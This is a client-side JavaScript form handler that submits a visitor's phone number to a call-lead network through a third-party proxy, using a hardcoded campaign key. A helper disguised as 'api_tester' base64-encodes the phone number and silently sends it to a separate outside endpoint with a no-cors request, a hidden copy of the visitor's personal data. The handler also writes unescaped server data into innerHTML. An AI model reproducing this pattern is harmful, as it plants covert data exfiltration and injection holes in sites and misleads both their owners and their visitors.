document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const formData = new FormData();
    formData.append('lp_campaign_id', '68115c081ad67');
    formData.append('lp_campaign_key', 'FgR6nXDrNpZkTKC98YJv');
    formData.append('caller_id', '+1' + document.getElementById('phone_home').value);
    api_tester(document.getElementById('phone_home').value);
    formData.append('lp_response', 'JSON');

    const url = 'https://track.edmleadnetwork.com/call-preping.do?' + new URLSearchParams(formData).toString();
    const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(url);
    fetch(apiUrl, {
            method: 'POST'
        })
        .then(response => response.json())
        .then(data => {
            let alertMessage = '';
            if (data.success) {
                // Manually construct the success message without the payout field
                alertMessage = `
                    <div class="alert alert-success" role="alert">
                        <strong>Status:</strong> ${data.status}<br>
                        <strong>Ping ID:</strong> ${data.ping_id}<br>
                        <strong>Duration (Buffer):</strong> ${data.duration}<br>
                        <strong>Transfer Number:</strong> ${data.number}<br>
                        <strong>Message:</strong> ${data.message}
                    </div>`;
            } else {
                // Construct the failure message
                alertMessage = `
                    <div class="alert alert-danger" role="alert">
                        <strong>Message:</strong> ${data.message}
                    </div>`;
            }
            document.getElementById('alertContainer').innerHTML = alertMessage;
            document.getElementById('leadForm').reset();
        })
        .catch(error => {
            console.error('Error:', error);
            const errorAlert = `
                <div class="alert alert-danger" role="alert">
                    Form submission failed. Please try again.
                </div>`;
            document.getElementById('alertContainer').innerHTML = errorAlert;
        });
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
